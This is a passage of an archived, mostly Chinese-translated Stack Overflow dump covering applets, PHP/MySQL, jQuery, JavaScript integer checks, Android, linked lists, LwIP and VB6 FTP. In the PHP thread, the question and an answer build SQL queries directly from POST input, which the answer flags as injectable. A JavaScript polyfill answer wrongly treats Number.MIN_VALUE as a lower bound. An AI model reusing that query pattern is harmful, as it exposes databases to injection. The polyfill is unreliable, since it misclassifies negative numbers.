C0.36328102,16.089764 0.19531237,15.79289 0.11718742,15.503829 C0.039062475,15.214768 -2.9646153E-21,15.007738 -2.9646153E-21,14.882738 C-2.9646153E-21,14.63274 0.06249996,14.449147 0.18749988,14.33196 C0.3124998,14.214773 0.57031213,14.156179 0.96093688,14.156179 C1.3515616,14.156179 1.8164051,14.187429 2.3554672,14.249929 C2.8945294,14.312429 3.4999977,14.343679 4.1718723,14.343679 C4.2968722,14.343679 4.4921846,14.33196 4.7578094,14.308522 C5.0234343,14.285085 5.3320278,14.261648 5.6835901,14.23821 C6.0351523,14.214773 6.4101521,14.187429 6.8085893,14.156179 C7.2070266,14.12493 7.6093701,14.09368 8.0156198,14.06243 C8.0312448,13.359308 8.0429635,12.613218 8.050776,11.82416 C8.0585885,11.035101 8.066401,10.281199 8.0742135,9.5624524 C8.082026,8.8437079 8.0898385,8.1913674 8.097651,7.6054309 C8.1054635,7.0194982 8.1093698,6.5780941 8.1093698,6.2812187 C8.1093698,5.6249739 8.1406197,4.9257586 8.2031197,4.1835729 C8.2656197,3.441391 8.3476509,2.7617069 8.4492133,2.1445206 C8.5507757,1.5273381 8.6679631,1.01562 8.8007756,0.60937199 C8.933588,0.20312402 9.0703066,2.8709165E-08 9.2109315,2.8709165E-08 z" Fill="Black" HorizontalAlignment="Left" Margin="205.727,221.132,0,223.454" RenderTransformOrigin="7.03586477018627,0.683653180122306" Stretch="Fill" Width="18.281" d:LayoutOverrides="HorizontalAlignment" Visibility="Hidden">
        <Path.RenderTransform>
            <TransformGroup>
                <ScaleTransform/>
                <SkewTransform/>
                <RotateTransform/>
                <TranslateTransform/>
            </TransformGroup>
        </Path.RenderTransform>
    </Path>
</Grid>
</UserControl> 
```

# java - Keep getting "java.security.AccessControlException access denied:" error

> ID：10270642
> 
> 赞同：0
> 
> 时间：2012-04-22T18:07:11.230
> 
> 标签：java, security, permissions, applet, japplet

So I have this applet which loads images from a directory but it looks like Java is giving me some permission issues. I am a newbie when it comes to making applets on the web and tried to find solutions but most involve either command prompt or terminal access to the server hosting to the page. I don't have access to that. (Running on GoDaddy shared hosting)

```
java.lang.reflect.InvocationTargetException
    at com.sun.deploy.util.DeployAWTUtil.invokeAndWait(DeployAWTUtil.java:116)
    at sun.plugin2.applet.Plugin2Manager.runOnEDT(Plugin2Manager.java:3541)
    at sun.plugin2.applet.Plugin2Manager.createApplet(Plugin2Manager.java:3072)
    at sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Plugin2Manager.java:1497)
    at java.lang.Thread.run(Thread.java:680)
Caused by: java.security.AccessControlException: access denied (java.io.FilePermission ./setup/USPresidentialSeal.png read)
    at java.security.AccessControlContext.checkPermission(AccessControlContext.java:374)
    at java.security.AccessController.checkPermission(AccessController.java:546)
    at java.lang.SecurityManager.checkPermission(SecurityManager.java:532)
    at java.lang.SecurityManager.checkRead(SecurityManager.java:871)
    at java.io.File.canRead(File.java:689)
    at javax.imageio.ImageIO.read(ImageIO.java:1274) 
```

I have a PNG image located at

> setup/USPresidentialSeal.png

Any help would be appreciated. (Also I am getting this error while running the applet from a HTML file located on my desktop.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:09:39.027

By default, applets do not have access to your local file system.

[How can an applet Read/Write files on the local file-system?](https://stackoverflow.com/questions/10102217/how-can-an-applet-read-write-files-on-the-local-file-system)

# php - PHP MySQL 检查

> ID：10270643
> 
> 赞同：-4
> 
> 时间：2012-04-22T18:07:12.283
> 
> 标签：php, mysql

我尝试编写的代码有点问题：

代码的目的是检查表中一行的两个字段是否匹配（这两个字段已经在代码中预定义，因此 field1 和 field2）。如果它们匹配，它将在 HTML 表中显示该行中的其余信息。如果这两个字段不匹配，则它会回显一条消息。

以下是我到目前为止所得到的：

```
### Connects to db
$dbhost = 'localhost';
$dbuser = 'username';
$dbpass = 'password';
$dbname = 'dbname';
mysql_select_db($dbname);

echo ("<table width=\"580px\" class=\"board\" border=\>

      <form method=\"post\" action=\"check_data.php\">
        <tr>        
          <td>Field1</td>
          <td>
            <input type=\"text\" name=\"f1\" 
        size=\"20\">
          </td>
        </tr>
        <tr>
          <td>Field 2</td>
          <td>
            <input type=\"text\" name=\"f2\" size=\"40\">
          </td>
        </tr>
        <tr>
          <td align=\"right\">
            <input type=\"submit\" 
          name=\"submit value\" value=\"Check\">
          </td>
        </tr>
      </form>
      </table>") 
```

Check_data.php 包含：

```
 ### Connects to db
    $dbhost = 'localhost';
    $dbuser = 'username';
    $dbpass = 'password';
    $dbname = 'dbname';
    mysql_select_db($dbname);

         $id = $_POST['f1'];
                 $points = $_POST['f2'];
   ## Query
    $check = "SELECT * FROM table WHERE `field1` = '$f1' AND `field2` = '$f2'";;
mysql_query($check);
echo("<div class=\"successful\">Field 1 and Field 2 match.

$check</div>"); 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:16:12.613

check_data.php 中的代码似乎不完整。我希望是这样的：

```
$dbhost = 'localhost';
$dbuser = 'username';
$dbpass = 'password';
$dbname = 'dbname';

if (!mysql_connect($dbhost, $dbuser, $dbpass)) {
    die('Not connected : ' . mysql_error());
}

if (!mysql_select_db($dbname)) {
    die ('Can\'t use foo : ' . mysql_error());
}

$id = $_POST['f1'];
$points = $_POST['f2'];
$check = "SELECT * FROM table WHERE `field1` = '$id' AND `field2` = '$points'";
$res = mysql_query($check);
if (!$res) {
    die('Invalid query: ' . mysql_error());
}

if( mysql_num_rows($res) > 0 ){
    // fields match
} else {
    // fields don't match
} 
```

顺便说一句，您应该小心，因为正如@AndrewLeach 指出的那样，此代码可能会导致 SQL 注入攻击。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:14:02.060

您的查询似乎正确。如果没有匹配，它将返回零行，因此您可以使用：

```
if (mysql_num_rows(mysql_query($check) > 0) {
    //yes, fields match
} else {
    //nop, fields don't match
} 
```

如果您需要比赛中的数据，请像这样使用：

```
$handle = mysql_query($check);
$result = mysql_fetch_assoc($handle);
if ($result) {
    echo $result['name']; //'name' is one of the table columns
} else {
    //no result
} 
```

# jquery - 这个函数是在 jquery 中预加载的好方法吗？

> ID：10270644
> 
> 赞同：0
> 
> 时间：2012-04-22T18:07:29.833
> 
> 标签：jquery

我在 jquery 中编写的这个函数是预加载的好方法吗？谢谢你

```
function loader(){

        imgTag('#check');

        function imgTag(whereToAppend){
            var image = 'image.jpg';

            $(whereToAppend).append('<img id="imgWrapper">');

            $('#imgWrapper').attr('src', image).hide().one('load',function(){
                $(this).fadeIn('slow');
            })
        }

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:09:05.783

我建议使用以下解决方案来预加载图像：

```
function preload(arrayOfImages) {
    $(arrayOfImages).each(function(){
        $('<img/>')[0].src = this;
        // Alternatively you could use:
        // (new Image()).src = this;
    });
}

// Usage:

preload([
    'img/imageName.jpg',
    'img/anotherOne.jpg',
    'img/blahblahblah.jpg'
]); 
```

来源：[使用 jQuery 预加载图像](https://stackoverflow.com/questions/476679/preloading-images-with-jquery)

# javascript - 确定 JavaScript 值是否为“整数”？

> ID：10270648
> 
> 赞同：81
> 
> 时间：2012-04-22T18:08:25.567
> 
> 标签：javascript, jquery

> **可能重复：**
> [检查变量是否包含 Javascript 中的数值？](https://stackoverflow.com/questions/600763/check-if-a-variable-contains-a-numerical-value-in-javascript)

如何检查变量是否是 jQuery 中的整数？

例子：

```
if (id == int) { // Do this } 
```

我使用以下内容从 URL 获取 ID。

```
var id = $.getURLParam("id"); 
```

但我想检查变量是否为整数。

* * *

## 回答 #1

> 赞同：198
> 
> 时间：2012-04-22T18:12:09.943

试试这个：

```
if(Math.floor(id) == id && $.isNumeric(id)) 
  alert('yes its an int!'); 
```

`$.isNumeric(id)`检查它是否是数字
`Math.floor(id) == id`然后确定它是否真的是整数值而不是浮点数。如果它是浮点数，则将其解析为 int 将给出与原始值不同的结果。如果它是 int 两者将是相同的。

* * *

## 回答 #2

> 赞同：49
> 
> 时间：2012-04-22T18:29:38.317

这是`Number`谓词函数的polyfill：

```
"use strict";

Number.isNaN = Number.isNaN ||
    n => n !== n; // only NaN

Number.isNumeric = Number.isNumeric ||
    n => n === +n; // all numbers excluding NaN

Number.isFinite = Number.isFinite ||
    n => n === +n               // all numbers excluding NaN
      && n >= Number.MIN_VALUE  // and -Infinity
      && n <= Number.MAX_VALUE; // and +Infinity

Number.isInteger = Number.isInteger ||
    n => n === +n              // all numbers excluding NaN
      && n >= Number.MIN_VALUE // and -Infinity
      && n <= Number.MAX_VALUE // and +Infinity
      && !(n % 1);             // and non-whole numbers

Number.isSafeInteger = Number.isSafeInteger ||
    n => n === +n                     // all numbers excluding NaN
      && n >= Number.MIN_SAFE_INTEGER // and small unsafe numbers
      && n <= Number.MAX_SAFE_INTEGER // and big unsafe numbers
      && !(n % 1);                    // and non-whole numbers 
```

所有主流浏览器都支持这些功能，除了`isNumeric`，因为我编的所以不在规范中。因此，您可以减小此 polyfill 的大小：

```
"use strict";

Number.isNumeric = Number.isNumeric ||
    n => n === +n; // all numbers excluding NaN 
```

`n === +n`或者，只需手动内联表达式。

* * *

## 回答 #3

> 赞同：29
> 
> 时间：2012-04-22T18:12:17.570

使用 jQuery 的 IsNumeric 方法。

[http://api.jquery.com/jQuery.isNumeric/](http://api.jquery.com/jQuery.isNumeric/)

```
if ($.isNumeric(id)) {
   //it's numeric
} 
```

更正：这不能确保**整数**。这个会：

```
if ( (id+"").match(/^\d+$/) ) {
   //it's all digits
} 
```

当然，这不使用 jQuery，但我认为只要解决方案有效，jQuery 实际上并不是强制性的

# android - 如何在对话框中从 ListView 获取值

> ID：10270650
> 
> 赞同：0
> 
> 时间：2012-04-22T18:08:43.943
> 
> 标签：android

我有一个 ListView，其中包含每个项目的一些文本和图片（实际上是行）。当我单击其中一个时，它会触发一个侦听器并打开一个对话框。

Dialog 中显示的内容是从 ListView 中的项目中检索的。我尝试了几种方法，但传入的参数都是空指针。

说，我正在尝试获取 listview 布局中的 hotelName 的值。该 TextView 的 id 是 R.id.nameTV

```
final Context context = this;

public void onCreate(Bundle blabla){

    final ListView listView = getListView();
    listView.setTextFilterEnabled(true);

    listView.setOnItemClickListener(new OnItemClickListener() {
        public void onItemClick(AdapterView<?> parent, View view, int position, long id) {

            final Dialog dialog = new Dialog(context);

            // this is the TextView in Dialog to hold the content from ListView
            TextView dHotelTV = (TextView)findViewById(R.id.hotelNameTV);

            CharSequence hotelName;
            /* 
                The way I tried:
                hotelName = context.getText(R.id.nameTV);
                hotelName = view.findViewById(R.id.nameTV); 

            */

            dialog.setTitle("EasyTrip");
            dialog.setContentView(R.layout.dialog);
            dHotelTV.setText(hotelName)

     }
} 
```

这些方法中的hotelName 都是空指针。它让我疯狂。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:16:56.653

从 textView 中拉出来：

```
hotelName = ((TextView) view.findViewById(R.id.my_important_textview)).getText(); 
```

此外，如果 dHotelTV 是对话框中的一个元素，您将不会`findViewById`在 Activity 中找到它，并且您会得到另一个 NullPointerException：

```
 dialog.setContentView(R.layout.dialog);
 TextView dHotelTV = (TextView)dialog.findViewById(R.id.hotelNameTV); 
```

请注意，它`findViewById()`是作用域的——它只寻找孩子。因此，如果您有一个 listView ，其中每个 Item 都由此布局定义：

```
<LinearLayout
  ...
>
  <TextView
    ...
    android:id="@+id/my_important_textView" />
  <TextView
    ...
    android:id="@+id/other_textview" />
</ LinearLayout> 
```

那么如果你调用`findViewById()`那个项目：

```
((TextView) view.findViewById(R.id.my_important_textview)).getText(); 
```

调用的范围仅限于您单击的项目。

# canvas - IE 7-8 中的 Flot 渲染 - 图表标签字体是正面的

> ID：10270652
> 
> 赞同：0
> 
> 时间：2012-04-22T18:08:45.980
> 
> 标签：canvas, internet-explorer-8, charts, internet-explorer-7, flot

我很困惑为什么在我的网络应用程序 Flot 中非常奇怪地渲染了标签字体（参见图表旁边的屏幕截图侧标签），而在查看 Flot 示例时，它们在同一个浏览器中呈现得很好（即 ​​7 和 8 模式） .

任何帮助，将不胜感激。

-- 字体应该是无衬线字体。

![在此处输入图像描述](../Images/e985be7e125459e54cae2b4061bfef9d.png)

例如，这是我的页眉：

### 标题

```
<!doctype html>
<html>
    <head><script type="text/javascript">var NREUMQ=NREUMQ||[];NREUMQ.push(["mark","firstbyte",new Date().getTime()]);</script>
            <title>Acme Inc. Contact Cloud</title>
            <meta name="description" content="View 's complete contact details on ContactMonkey.com." >
            <meta name="robots" content="noindex,noarchive,nofollow" />
                <link rel="icon" type="image/png" href="/system/favicons/45/original/favicon.png?1329843127" />
            <link href="/stylesheets/whitelabel.css?1335117438" media="screen" rel="stylesheet" type="text/css" />
<link href="/stylesheets/autoSuggest.css?1335117438" media="screen" rel="stylesheet" type="text/css" />
                <link rel="stylesheet" href="/stylesheets-clients/acme.css" type="text/css" />
        <link href="/stylesheets/anythingslider.css?1335117438" media="screen" rel="stylesheet" type="text/css" />
<link href="/stylesheets/colorbox.css?1335117438" media="screen" rel="stylesheet" type="text/css" />
        <!--[if lte IE 9]><script src="/javascripts/flot/excanvas.min.js?1335117438" type="text/javascript"></script><![endif]-->
        <script src="/javascripts/flot/excanvas.min.js?1335117438" type="text/javascript"></script>
        <script src="/javascripts/jquery.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.colorbox-min.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery-ui-min.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/application.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/application_new.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery_ujs.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/form_validations.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/css_browser_selector.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.form.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.remotipart.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.infieldlabel.min.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.cookie.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.livequery.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.autogrow.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/si.files.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.anythingslider.fx.min.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.anythingslider.min.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.easing.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.keyfilter.min.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.cycle.min.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.autoSuggest.packed.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/edit_card_modal.js?1335117438" type="text/javascript"></script>
<script src="/javascripts/jquery.resize.min.js?1335117438" type="text/javascript"></script> 
```

页面特定脚本：

```
<link href="/stylesheets/charts.css?1335117438" media="screen" rel="stylesheet" type="text/css" />
    <script src="/javascripts/underscore.js?1335117438" type="text/javascript"></script>
    <script src="/javascripts/flot/jquery.flot.js?1335117438" type="text/javascript"></script>
    <script src="/javascripts/flot/jquery.flot.categories.js?1335117438" type="text/javascript"></script>
    <script src="/javascripts/flot/jquery.flot.stack.js?1335117438" type="text/javascript"></script>
    <script src="/javascripts/charts.js?1335117438" type="text/javascript"></script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-14T15:47:30.733

问题在于将画布文本呈现为 IE 6-8 兼容文本的库。除了将文本呈现为纯文本并切换到不同的图表库之外，我没有其他解决方案。

# jquery - 翻转时显示，如果内容可见，则替换它

> ID：10270657
> 
> 赞同：0
> 
> 时间：2012-04-22T18:09:04.523
> 
> 标签：jquery, drop-down-menu

我一直在努力让这件事按照我的情节发挥作用。
基本上我希望完成的是将它修改为一个下拉菜单，当您将鼠标悬停在按钮上时会打开该菜单，但在您将鼠标悬停在其他按钮上时会更改内容。

1.  在 Rollover 上显示内容（向下滑动动画）。

2.  翻转下一个按钮 - 如果内容可见，则替换内容
3.  在推出导航区域时隐藏内容（向上滑动动画）

**请看这里：[jsfiddle.net/CvhkM/2726](http://jsfiddle.net/CvhkM/2726) 下拉菜单，如果它打开，替换内容。再次推出关闭**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T17:07:15.253

对不起，我不小心编辑了你的小提琴，但这是你的意思吗？我不是 100% 清楚你想要做什么，但我认为它是这样的：

[http://jsfiddle.net/CvhkM/2724/](http://jsfiddle.net/CvhkM/2724/)

我认为您的问题是您使用的是该 hoverIntent() 函数，而不是默认的 hover()，它可以正常工作。同样，不确定这是否是您要寻找的。

**编辑**（再次）

这更像是你想要的吗？

[http://jsfiddle.net/sSynX/1/](http://jsfiddle.net/sSynX/1/)

# delphi - 正在寻找 Delphi 的事件调度程序？

> ID：10270660
> 
> 赞同：5
> 
> 时间：2012-04-22T18:09:34.063
> 
> 标签：delphi, jedi

我最近正在查看 JVCL 库附带的 TJvScheduledEvents，因为我需要在 Delphi 应用程序中使用动态调度程序。最初这看起来符合要求，但我遇到了一些问题。

*   除代码本身之外的有限文档
*   允许您创建事件的事件调度程序表单似乎是没有运行时界面的设计时表单。
*   将动态创建的计划事件存储到文件或数据库以使它们在应用程序重新启动时不会丢失的问题。

有没有人对此对象或其他调度接口有任何经验。如果有其他选择，我宁愿不必自己构建它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T16:38:05.633

我使用了@LURD 在上面的评论中引用的[CRON 调度程序](http://www.cromis.net/blog/downloads/cron-scheduler/)。它按预期工作并且非常容易集成。我也喜欢它干净地支持运行预定事件的线程并适合我正在寻找的东西。

# cakephp-2.1 - CakePHP 2.1.1。可控制的行为不起作用

> ID：10270662
> 
> 赞同：0
> 
> 时间：2012-04-22T18:09:38.623
> 
> 标签：cakephp-2.1

我正在使用 cakephp 2.1.1。这是我的表关联：x hasmany y hasmany z hasmany w。

我认为一切都正确设置但是当我进行此查询时：

```
$conditions = array(
'contain' => array(
'y' => array (
            'z' => array(
                'w'=> array(
                    'conditions' => array('col>=' => $q))
     )
 )
 ));

$this->loadmodel('x');
 $o=$this->x->find('all',$conditions);//array(
 debug($o); 
```

我没有我想要的结果；仅获取表 x！为什么？例如，这是我的模型 x php 代码，与其他代码类似：

```
 <? php

class x extends AppModel
{
    var $name='x';
    public $actsAs = array('Containable');
    public $hasMany = array( 'y');
} 
```

也许 cakephp 版本？谢谢！

信息：我想发表这样的声明：

```
select z.col1, y.col2, x.col3
from z, y, x, w
where  w.col>= 3
and w.z_id = z.id
and z.y_id = y.id
and z.x_id = x.id 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-27T09:43:30.227

这里有很多点。

首先，如果 Behavior 不起作用，则可能不应该假设任何事情，最重要的是一切都很好！;)

我假设您已经删除了大量代码，因为您的关系没有定义任何外键，如果 Cake 要连接您的模型，这非常关键。

不知道你为什么要使用`loadModel()`这种东西，因为这种事情应该在 Model X 的控制器或 X Model 中完成。所以你不应该加载模型。如果您的关联工作正常，Contain 将在运行过程中加载模型。

至于你所期望的 SQL 语句，不幸的是 Containable 不会像这样加入模型，并且会加入几个模型，但是如果你有`hasMany`它会运行一系列`SELECT`语句来获取额外的数据，然后将它们全部加入。

它还使用 a`LEFT JOIN`而不是您预期的`CROSS JOIN`. 这可以在 Containable 的选项中进行配置，或者您可以实例化一个新的 db 对象并创建一个子查询。

回到你的问题，

*   我会先在这里检查模型关联。
*   我会阅读这本书，看看你是否正确地创建了关联。 [http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html#hasmany](http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html#hasmany)
*   我还将确保您的实际数据库架构是正确的。您的外键遵循命名约定或在模型中定义。
*   我会尝试备份我的模型文件并使用 Cake Console 来`cake bake model`查看烘焙模型是否`Contain` 正确。

希望这能给你一个起点，如果你当然还没有解决这个问题！

# ios - 主视图控制器 -> 详细视图控制器通信

> ID：10270664
> 
> 赞同：0
> 
> 时间：2012-04-22T18:09:45.890
> 
> 标签：ios, xcode, ipad, master-detail

是否有可能从详细视图控制器访问主视图控制器中定义的数组？我在 xCode 中有一个主从应用程序。在主视图控制器中定义了一个数组。在详细视图控制器中，根据该数组中的一个条目，有详细信息。

是否可以从 Detail View Controller 访问数组并更新它们？

如何将数组的引用从 Master 传递到 Detail？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:27:51.663

您的主视图和详细视图之间是否有任何链接？

如果是这样，那么您可以通过将其设置为`@property`可以从详细视图控制器访问的主视图控制器的“”来公开对数组的访问。

[这是一个相关的问题，其答案可能对您有所帮助](https://stackoverflow.com/questions/9134275/how-do-i-reference-the-detailviewcontroller-on-an-ipad-that-is-using-a-splitview)。我不能给你比这更具体的答案，因为你还没有说你是如何设置你的 Master <-> Detail View Controller 实现的。

# performance - 与链表反转相关的一个想法

> ID：10270666
> 
> 赞同：3
> 
> 时间：2012-04-22T18:10:13.660
> 
> 标签：performance, algorithm, data-structures, linked-list

自从我听说在采访中被问到很多问题以来，我一直有一些事情困扰着我。**反转单链表。**问题是我已经检查了实现，我想知道我的想法是否可以应用

`|data1|->|data2|->|data3|->|data4|->|data5|`

这个结构就是链表的初始条件。我在想，当我们想要逆转时，会不会是这样；

`|data5|->|data4|->|data3|->|data2|->|data1|`

因此，在一个需要**O(n)运行时间的循环中，只需将****节点 #1**与**节点 #5**的数据反转，**节点 #2**与**节点 #4**就可以完成这项工作吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-23T04:51:51.030

```
 typedef struct Node
   {
     char data;
     struct Node* next;
   } Node; 
```

```
 Node* reverse(Node* root)
    {
       Node* new_root = 0;
       while (root)
       {
           Node* next = root->next;
           root->next = new_root;
           new_root = root;
           root = next;
       }
       return new_root; 
    } 
```

```
int main()
{
   Node d = { 'd', 0 };
   Node c = { 'c', &d };
   Node b = { 'b', &c };
   Node a = { 'a', &b };
   Node* root = &a; 
   root = reverse(root);
   return 0;
 } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-22T18:16:45.997

您的算法要求我们从节点 5 开始，然后从那里向后工作。但它是一个单链表——这意味着我们没有“后退”指针。即使我们对节点有 O(1) 访问权限`tail`，从节点 5 到节点 4 本身也是一个 O(N) 操作，因为我们需要从节点 1 重新开始才能到达节点 4。

因此，对于单链表来说，这不是一个好的算法。对于双向链表，我们可以访问反向指针，它会给我们 O(N) 复杂度。（您的算法也不完全与类型无关，因为它要求存储在每个节点中的数据是可复制或可移动的，以便我们可以交换它。​​）

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-22T18:16:56.710

您想编写一个方法`insert_head`并重复使用它。因此，您从原始列表的头部开始，并附加到新链表的头部。因此，原始列表的尾部成为新列表的头部。

这是另一种方法：遍历您的原始列表，将节点推入堆栈。然后，弹出并`insert_at_tail`进入一个新列表。

您的算法失败了，因为您无法及时在**单**链表中倒退`O(1)`。按照你的建议做，它是`O(n)`每个节点（你每次从头一直走到你要获取前一个节点的地方），因此反转整个列表是`O(n^2)`.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-23T00:31:48.250

当被问到时，通常的限制是将列表反转到位，这样您就不会使用任何额外的空间，除了三个或更少的变量。这就是为什么这个问题不是微不足道的。因此，您既不能使用递归，也不能使用您自己的显式堆栈，也不能使用另一个 LL（您将在其中执行`LL.addToHead(el)`原始操作）。

所以这是一个很好的答案 O(n) 时间和 O(1) 空间：

```
Node reverse(Node n){//n is head; you may also get the LL
    if(null == n || null == n.next)
       return n;
    Node a=n, b=a.next, c=b.next;
    a.next=null; b.next=a;
    while(null != c){
       a=c;
       c=c.next;
       a.next=b;
       b=a;
    }
    return b;
} 
```

顺便说一句，您提出的解决方案是 O(n^2)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-22T19:35:05.617

仅根据节点在最终输出中的位置来反转节点的数据并不是一个好主意，原因有两个：

1.  如果列表很大，这将不是一个可行的解决方案
2.  以任意方式访问节点的时间更多。该方法将花费比 O(n) 更多的时间。

考虑这个伪代码：

```
reverse_list(node *head) 
{
  node *temp;
  *temp = head -> next;
  head-> next = NULL;

  while (temp != NULL) {
     swap_nodes(head, temp->next);  // this aint copying data from nodes, actual nodes are 
     swap_nodes(head, temp);        // swapped based on its and parents' next pointers  
  }
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-22T18:20:25.523

有一个`O(n)`使用`O(n)`空间的解决方案。考虑回避在线性时间内访问元素的问题。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-04-22T18:28:53.290

如果列表是异构的，或者节点的大小不相等，这个想法就会失败。举个例子：

```
struct base {
   int type;
   struct base *next;
   };

struct small {
   struct base common;
   int value;
   };

struct big {
    struct base common;
    char payload[12345];
    }; 
```

# network-programming - LwIP - netconn API - 在进程被阻塞时发送 TCP 数据包？

> ID：10270673
> 
> 赞同：7
> 
> 时间：2012-04-22T18:10:54.907
> 
> 标签：network-programming, embedded, voip, freertos, lwip

我正在使用 FreeRTOS + **LwIP**开发基于以太网的床边护士呼叫设备。看了一些例子和文档后，我想用LwIP的**netconn API**在TCP下发送和接收数据，因为我不熟悉BSD风格的API，原始API可能比较难。

我知道该`netconn_accept()`函数会阻塞进程，直到来自远程主机的连接请求到达，并且该`netconn_recv()`函数也会在等待数据到达时阻塞进程......这两个函数都会**阻塞**进程，这对服务器有好处接收数据，但是，我的设备还需要充当客户端，当患者按下按钮时，需要触发对护士中心的“呼叫”。**那么它如何在等待来自远程主机的连接（阻塞进程）的同时发起发送 TCP 数据包呢？**

我需要发送 TCP，因为我必须使用 SIP（​​会话发起协议）来发起呼叫，它应该是可靠的，因为它是一个医疗设备。非常感谢你

* * *

@Kyle Heironimus ，@werewindle 我将您添加到我的问题中，因为我知道您在 LwIP 方面有经验，希望不会给您带来不便，希望您能提供帮助，谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-26T16:15:10.347

在远程主机启动连接之前，您不能将数据发送到远程主机。那没有任何意义。我的问题是：您希望您的设备连接到远程主机，还是希望远程主机启动与您的设备的连接？

现在您正在设备中使用 netconn_accept - 这意味着您正在等待远程主机启动与您的设备的连接，然后您的设备才能向远程主机发出信号。对于您编写的代码，这完全是预期的行为，但您似乎对此感到担忧。这不是你的本意吗？如果不是，你为什么要这样编码？另一种选择是让您的设备启动与远程主机的连接。[这里](http://lwip.wikia.com/wiki/Netconn_connect)有一个使用 netconns 的例子。当然，这也涉及对系统中其他设备的更改。

所以这个故事的寓意是，当没有连接时，您不能发送任何数据，并且您在发送数据之前正在等待连接。您不想等待连接，因此您必须更改软件以启动连接，而不是等待对方启动它。

您可能遇到的另一个问题是您希望能够同时在同一连接上发送和接收数据。我看到的关于 lwip 的大多数示例都涉及阻塞等待数据的调用，然后通过回传某些内容来对该数据做出反应。有时您想在没有先接收到某些内容的情况下将某些内容传回。我也可以帮忙。

当我创建监听 netconn 连接时，这对我有用。

首先，您必须通过设置启用超时：

> #define LWIP_SO_RCVTIMEO 1

然后你必须像这样设置你的netconn：

> pxTCPListener = netconn_new (NETCONN_TCP);
> 
> netconn_bind (pxTCPListener, NULL, 23);
> 
> netconn_listen (pxTCPListener);
> 
> pxNewConnection = netconn_accept (pxTCPListener); //这会阻塞直到连接被接受
> 
> //这是重要的一行！
> 
> pxNewConnection->recv_timeout = 10; //注意这是毫秒 - lwip 在毫秒内工作
> 
> //这个循环直到连接关闭
> 
> while(!ERR_IS_FATAL(pxNewConnection->err)) { //致命错误包括连接被关闭、重置、中止等
> 
> //此 netconn_recv 调用现在将等待 10ms 等待任何新数据，然后返回
> 
> if ((pxRxBuffer = netconn_recv (pxNewConnection)) != NULL) {
> 
> //处理接收到的数据
> 
> }
> 
> //在这里，做任何你想要的传输
> 
> } //上面的while循环结束

该代码将允许您同时进行传输和接收，而不必担心阻塞。

# vb6 - 如何使用 Inet.OCX 将 FTP 站点内的所有目录返回到 VB6 列表框？

> ID：10270674
> 
> 赞同：3
> 
> 时间：2012-04-22T18:10:59.460
> 
> 标签：vb6, ftp, inet

我有一个 VB6 项目，它可以很好地连接到 ftp 远程服务器（即：ftp: [//ftp.microsoft.com](ftp://ftp.microsoft.com)），我想仅使用 Inet1.ocx 将 ftp 服务器中的所有目录名称列出到 ListBox 中。我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T19:49:15.363

*摘自@AhmedEbied 对我下面的回答的评论。*

* * *

好，我知道了。我们将使用 (DIR)，即 FTP 命令来检索 FTP 服务器中的目录。使用 (DIR) COMMAND Inet1.Execute , ("DIR")

```
' CommandButton 
Private Sub Get_Dir_Click() 
  Dim Data as String, Data1 as String 

  ' Get List of all files 
  Do Data1 = Inet1.GetChunk(1024, icString) 
    Data = Data & Data1 
  Loop While Len(Data1) <> 0 

  Text4.Text = Data 
End Sub 
```

当然，我有`UsrName`,`PassWord`和`URL`到位。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T18:25:37.727

您可以安装一个支持 FTP 的 ActiveX 组件，例如：[Chilkat FTP](http://www.chilkatsoft.com/chilkatftp.asp)。请注意，有一个免费版本，称为 FTP，还有一个付费版本，称为 FTP2。出于您的目的，免费的应该就足够了。

请参阅[文档](http://www.chilkatsoft.com/refdoc/xChilkatFtpRef.html)和[示例页面](http://www.example-code.com/vb/ftp.asp)以开始使用。

# wcf - WCF 服务中的自动重新连接

> ID：10270675
> 
> 赞同：2
> 
